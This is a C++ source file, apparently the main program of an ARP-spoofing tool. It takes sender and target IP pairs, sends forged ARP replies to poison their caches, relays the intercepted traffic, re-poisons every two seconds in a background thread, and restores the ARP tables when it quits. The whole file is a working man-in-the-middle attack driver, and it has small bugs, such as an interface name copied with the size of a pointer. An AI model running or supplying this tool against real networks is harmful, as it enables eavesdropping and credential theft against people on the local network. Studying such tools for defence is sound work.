#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include <stdbool.h>
#include <fcntl.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "attackerinfo.h"	// get attacker address info
#include "arputility.h"		// arp functions

#pragma pack(push, 1)
#pragma pack(pop)

#define MAXFLOW 5
#define MAXINTERFACELENGTH 20

static pthread_t thr;
static int thr_id;
static bool thr_exit = true;
static void* treturn;

void thread_start();
void thread_stop();
void* thread_function(void* arg);

struct EthArpPacket {
        EthHdr eth_;
        ArpHdr arp_;
};

Mac attacker_mac;
Ip attacker_ip;
Mac sender_mac[MAXFLOW];
Ip sender_ip[MAXFLOW];
Mac target_mac[MAXFLOW];
Ip target_ip[MAXFLOW];
int flow;
char interface[MAXINTERFACELENGTH];

void usage() {
	printf("> wrong format!\n");
        printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool checkFormat(int argc, char* argv[]) {
	printf("checking input format...\n");
	if(argc < 3 || argc % 2 == 1)
		return false;
	for(int i = 2 ; i < argc ; i++){
		unsigned int a, b, c, d;
        	int res = sscanf(argv[i], "%u.%u.%u.%u", &a, &b, &c, &d);
        	if(res != 4)
			return false;
		int index;
		
		if(i % 2 == 0)		// sender
			sender_ip[(i-2)/2] = htonl(Ip(argv[i]));
		else 			// target
			target_ip[(i-3)/2] = htonl(Ip(argv[i]));
		
	}
	flow = (argc - 1)/2;
	memcpy(interface, argv[1], sizeof(argv[1]));
	printf("> right format!\n\n");

	return true;
}

void printMac(Mac mac) {
	uint8_t a[6];
	memcpy(a, &mac, sizeof(Mac));
	for(int i = 0 ; i < 6 ; i++) {
		printf("%02x", a[i]);
		if(i < 5)
			printf(":");
	}
}

void printIp(Ip ip) {
	int a;
	memcpy(&a, &ip, sizeof(Ip));
	printf("%d.%d.%d.%d", ((a&0xff)), ((a&0xff00)>>8), ((a&0xff0000)>>16), ((a&0xff000000)>>24));
}

void printAtkInfo() {
	printf("============================\n");
	printf("attacker info\n");
	printf("Mac addr : ");
	printMac(attacker_mac);
	printf("\n");
	printf("Ip addr : ");
	printIp(attacker_ip);
	printf("\n");
	printf("============================\n\n");
}

void printSpoofInfo(int i) {
	printf("===========flow %d===========\n", i);
        printf("sender%d info\n", i);
        printf("Mac addr : ");
        printMac(sender_mac[i]);
        printf("\n");
        printf("Ip addr : ");
        printIp(sender_ip[i]);
        printf("\n");
	printf("target%d info\n", i);
	printf("Mac addr : ");
	printMac(target_mac[i]);
	printf("\n");
	printf("Ip addr : ");
	printIp(target_ip[i]);
	printf("\n");
        printf("============================\n");
}

bool getAtkInfo() {
	printf("trying to catch attacker mac, ip address...\n");
	if(getAtkMac(&attacker_mac) == false) {
		printf("cant get attacker mac address\n");
		printf("program terminated!\n");
		return false;
	
	}
	if(getAtkIp(&attacker_ip) == false) {
		printf("cant get attaker ip address\n");
		printf("program terminated!\n");
		return false;
	}
	printf("> catch attacker mac, ip address successfully!\n");
	printAtkInfo();
	return true;
}

bool getSpoofInfo() {
	for(int i = 0 ; i < flow ; i++) {
		printf("trying to catch sender%d info...\n", i);
		if(sender_mac[i] == Mac("00:00:00:00:00:00")) {
			if(getUserMac(interface, &attacker_mac, &attacker_ip, &sender_mac[i], &sender_ip[i]) == false) {
				printf("failed to get mac of sender ip ");
				printIp(sender_ip[i]);
				printf("\n");
				printf("program terminated!\n");
				return false;
			}
			for(int j = i + 1 ; j < flow ; j++) {
				if(sender_ip[j] == sender_ip[i])
					sender_mac[j] = sender_mac[i];
			}
		}
		printf("> done!\n");
	}

	for(int i = 0 ; i < flow ; i++) {
                printf("trying to catch target%d info...\n", i);
                if(target_mac[i] == Mac("00:00:00:00:00:00")) {
                        if(getUserMac(interface, &attacker_mac, &attacker_ip, &target_mac[i], &target_ip[i]) == false) {
                                printf("failed to get mac of target ip ");
                                printIp(target_ip[i]);
                                printf("\n");
                                printf("program terminated!\n");
                                return false;
                        }
                        for(int j = i + 1 ; j < flow ; j++) {
                                if(target_ip[j] == target_ip[i])
                                        target_mac[j] = target_mac[i];
                        }
                }
		printf("> done!\n");
        }
	printf("\nprinting flow info...\n");
	for(int i = 0 ; i < flow ; i++)
                printSpoofInfo(i);
	printf("> done!\n");
	return true;
}

bool beginAtk() {
	if(beginSpoof(interface, &attacker_mac, &attacker_ip, sender_mac, sender_ip, target_ip, flow) == false) {
		printf("attack failed!\n");
		printf("program terminated!\n");
		return false;
	}
	return true;
}

bool startAtk() {
	printf("\nattack start!\n\n");
	sleep(1);
	printf("sending fake arp packets...\n");
	if(beginAtk() == false)
		return false;
	printf("> done!\n");
	return true;
}

bool keepAtk() {
	printf("\nrelaying packets...\n");
	printf("press q to exit process\n");
	if(keepSpoof(interface, &attacker_mac, &attacker_ip, sender_mac, sender_ip, target_mac, target_ip, flow) == false) {
		printf("attack failed!\n");
		printf("program terminated!\n");
		return false;
	}
	printf("> done!\n");
	return true;
}

void endProcess() {
	printf("\nrecovering arp tables...\n");
	endSpoof(interface, &attacker_mac, sender_mac, sender_ip, target_mac, target_ip, flow);
	printf("> done!\n");
	attacker_mac = Mac("00:00:00:00:00:00");
	attacker_ip = Ip("0.0.0.0");
	for(int i = 0 ; i< MAXFLOW ; i++) {
		sender_mac[i] = Mac("00:00:00:00:00:00");
		sender_ip[i] = Ip("0.0.0.0");
		target_ip[i] = Ip("0.0.0.0");
	}
	flow = 0;
	memset(interface, 0, MAXINTERFACELENGTH);

	printf("\nprocess end!\n");
}

int main(int argc, char* argv[]) {
	if (checkFormat(argc, argv) == false) {
		usage();
		return -1;
	}

	if(getAtkInfo() == false)
		return -1;

	if(getSpoofInfo() == false)
		return -1;

	if(startAtk() == false)
		return -1;

	thread_start();
	
	if(keepAtk() == false)
		return -1;

	thread_stop();

	endProcess();

	return 0;
}

void thread_start() {
	thr_exit = false;
	thr_id = pthread_create(&thr, NULL, thread_function, NULL);
}

void thread_stop() {
	thr_exit = true;
	thr_id = pthread_join(thr, &treturn);
}

void* thread_function(void* arg) {
	while(!thr_exit) {
		sleep(2);
		beginAtk();
	}
	pthread_exit((void*)0);
}
